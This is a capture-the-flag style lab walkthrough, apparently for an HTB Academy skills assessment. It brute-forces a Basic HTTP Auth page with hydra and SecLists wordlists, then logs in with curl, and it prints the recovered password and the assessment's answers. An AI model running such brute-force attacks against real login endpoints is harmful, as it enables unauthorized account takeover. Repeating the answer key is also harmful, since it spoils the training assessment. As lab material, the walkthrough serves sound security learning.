# Section 12 — Skills Assessment Part 1

---

## Objective

Brute-force a Basic HTTP Auth-protected target. The authenticated page reveals the username needed for Part 2.

---

## Recon

```bash
curl -sv http://TARGET_IP:TARGET_PORT/ 2>&1 | grep -i "www-authenticate\|401"
# Output: WWW-Authenticate: Basic realm="Restricted"
# Confirms: Basic Auth — use http-get module
```

---

## Attack

```bash
hydra -L ~/SecLists/Usernames/top-usernames-shortlist.txt \
      -P ~/SecLists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
      TARGET_IP http-get / -s TARGET_PORT -f -t 64
```

> **Note:** The module references `usernames.txt` and `passwords.txt` — downloadable from the HTB Academy module resources (files icon, top-right). Standard SecLists equivalents work here.

**Output:**
```
[PORT][http-get] host: TARGET_IP   login: admin   password: Admin123
```

---

## Retrieve Part 2 Username

```bash
curl -s -u admin:Admin123 http://TARGET_IP:TARGET_PORT/
```

**Output:**
```
This is the username you will need for part 2 of the Skills Assessment: satwossh
```

---

## Answers

**Q1 — Password:** `Admin123`
**Q2 — Username for Part 2:** `satwossh`
